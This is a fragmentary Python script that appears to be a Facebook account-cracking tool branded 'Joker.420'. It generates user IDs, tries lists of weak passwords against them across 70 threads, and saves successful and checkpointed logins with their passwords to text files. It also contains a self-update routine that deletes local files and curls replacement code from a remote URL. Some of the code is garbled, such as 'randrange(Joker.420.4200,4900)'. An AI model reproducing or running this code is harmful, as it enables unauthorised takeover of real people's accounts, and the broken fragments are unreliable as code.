...
os.system('xdg-open http://wa.me/+937072660126')
...
for xd in range(5000):
	...
	i='0'
	j=random.randrange(Joker.420.4200,4900)
...
try:
    ...
    proxy = requests.get(' https://www.facebook.com/asadullah.shirzad.56update.txt').text.splitlines()
    v = 3.1
    update = requests.get(' https://www.facebook.com/asadullah.shirzad.56version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L  https://www.facebook.com/asadullah.shirzad.56ali.py > ali.py')
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+937072660126text=SN.JAN💜🐰Sir😪💕')
	if riaz1 =='3':
		os.system('xdg-openhttps://www.facebook.com/Afg.Hacker.Joker.420.Khan');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def m1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'Afghan123','AfJoker.420stan','afghan12345','kabul123','100200']
...
def m2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','AfJoker.420stan','Afghan12345','kabul123','۱۲۳۴۵۶']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def m3():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','AfJoker.420stan','Afghan12345','kabul123','Ahmad123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Joker.420-OK] '+cid+'|'+ps+'\033[0;97m')
                open('Joker.420-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[Joker.420-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('Joker.420-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mJoker.420-KHAN\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
